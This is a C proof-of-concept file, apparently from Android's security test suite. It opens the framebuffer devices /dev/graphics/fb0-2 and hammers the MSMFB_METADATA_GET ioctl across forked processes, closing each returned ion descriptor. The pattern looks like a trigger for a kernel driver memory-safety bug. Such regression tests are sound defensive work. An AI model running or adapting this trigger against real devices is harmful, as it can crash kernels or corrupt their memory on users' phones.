/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include "local_poc.h"

int main(int argc, char **argv) {
  int ret, count;
  int j = 0;
  int fd;
  struct msmfb_metadata data;
  void *addr;
  int pc = 3;
  char driver[32] = {0};

  for (int i = 0; i < 3; i++) {
    if (snprintf(driver, sizeof(driver), "/dev/graphics/fb%d", i) < 0) {
      exit(EXIT_FAILURE);
    }
    while (pc-- > 0) fork();

    fd = open(driver, O_RDWR, 0);
    if (fd < 0) {
      return -1;
    }

    addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (addr == MAP_FAILED) {
      close(fd);
      return -1;
    }

    count = 0;
  retry:
    memset(&data, 0x0, sizeof(data));
    data.op = metadata_op_get_ion_fd;
    ret = ioctl(fd, MSMFB_METADATA_GET, &data);

    close(data.data.fbmem_ionfd);
    j++;
    if (j < 10000) {
      goto retry;
    }

    munmap(addr, 4096);

    close(fd);
  }
  return 0;
}
